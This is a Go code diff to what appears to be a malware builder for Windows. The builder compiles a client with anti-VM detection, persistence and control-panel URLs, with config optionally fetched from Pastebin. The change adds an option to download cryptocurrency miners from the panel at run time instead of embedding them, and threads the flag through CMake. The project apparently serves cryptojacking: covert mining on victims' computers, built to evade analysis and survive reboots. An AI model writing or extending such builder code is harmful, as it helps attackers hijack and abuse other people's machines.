@@ -87,6 +87,12 @@ func buildClientNonInteractiveWindows() error {
 	debugConsole := *debugFlag
 	antiVM := *antiVMFlag
 	persistence := *persistenceFlag
+	remoteMiners := *remoteMinersFlag
+
+	// Validate: remote miners requires panel URL (can't work with empty panel)
+	if remoteMiners && panelURL == "" {
+		return fmt.Errorf("remote miner loading requires panel URL (not available with GET config method)")
+	}
 
 	urlCount := len(strings.Split(panelURL, ","))
 	logInfo("Using %d panel URL(s) with fallback support", urlCount)
@@ -97,8 +103,9 @@ func buildClientNonInteractiveWindows() error {
 	logInfo("  Debug Console: %v", debugConsole)
 	logInfo("  Anti-VM Detection: %v", antiVM)
 	logInfo("  Persistence: %v", persistence)
+	logInfo("  Remote Miners: %v", remoteMiners)
 
-	return executeBuildWindows(panelURL, "", false, processMonitoring, debugConsole, antiVM, persistence)
+	return executeBuildWindows(panelURL, "", false, processMonitoring, debugConsole, antiVM, persistence, remoteMiners)
 }
 
 // buildClientWindows orchestrates the full build pipeline for Windows
@@ -178,6 +185,18 @@ func buildClientWindows() error {
 	persistenceInput, _ := reader.ReadString('\n')
 	persistence := strings.TrimSpace(persistenceInput) == "y"
 
+	// Get remote miners preference (only if using POST method with panel)
+	var remoteMiners bool
+	if !useGetConfig {
+		fmt.Print("Download miners from panel instead of embedding? (y/n): ")
+		remoteMinersInput, _ := reader.ReadString('\n')
+		remoteMiners = strings.TrimSpace(remoteMinersInput) == "y"
+	} else {
+		// Remote loading not available with GET config (Pastebin)
+		remoteMiners = false
+		logInfo("Note: Remote miner loading is disabled (not available with GET config method)")
+	}
+
 	logInfo("\n[BUILD CONFIGURATION]")
 	if useGetConfig {
 		logInfo("Config Method: GET request from Pastebin/endpoint")
@@ -190,12 +209,13 @@ func buildClientWindows() error {
 	logInfo("Debug Console: %v", debugConsole)
 	logInfo("  Anti-VM Detection: %v", antiVM)
 	logInfo("  Persistence: %v", persistence)
+	logInfo("  Remote Miners: %v", remoteMiners)
 
-	return executeBuildWindows(panelURL, configURL, useGetConfig, processMonitoring, debugConsole, antiVM, persistence)
+	return executeBuildWindows(panelURL, configURL, useGetConfig, processMonitoring, debugConsole, antiVM, persistence, remoteMiners)
 }
 
 // executeBuildWindows performs the actual build process on Windows
-func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonitoring, debugConsole, antiVM, persistence bool) error {
+func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonitoring, debugConsole, antiVM, persistence, remoteMiners bool) error {
 	// Clean build directory first to ensure no stale CMake cache or files
 	logInfo("Cleaning build directory: %s", buildDir)
 	if err := os.RemoveAll(buildDir); err != nil {
@@ -274,7 +294,7 @@ func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonito
 
 	// Run CMake
 	logInfo("Configuring project with CMake...")
-	if err := runCMakeWindows(configURL, antiVM, persistence, debugConsole); err != nil {
+	if err := runCMakeWindows(configURL, antiVM, persistence, debugConsole, remoteMiners); err != nil {
 		return fmt.Errorf("CMake configuration failed: %v", err)
 	}
 
@@ -314,7 +334,7 @@ func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonito
 }
 
 // runCMakeWindows runs CMake for Windows with Visual Studio generator
-func runCMakeWindows(configURL string, antiVM bool, persistence bool, debugConsole bool) error {
+func runCMakeWindows(configURL string, antiVM bool, persistence bool, debugConsole bool, remoteMiners bool) error {
 	// List of generators to try in order
 	generators := []string{
 		"Visual Studio 17 2022",
@@ -339,6 +359,10 @@ func runCMakeWindows(configURL string, antiVM bool, persistence bool, debugConso
 
 		if debugConsole {
 			args = append(args, "-DENABLE_DEBUG_CONSOLE=ON")
+		}
+
+		if remoteMiners {
+			args = append(args, "-DENABLE_REMOTE_MINERS=ON")
 		}
 
 		if configURL != "" {
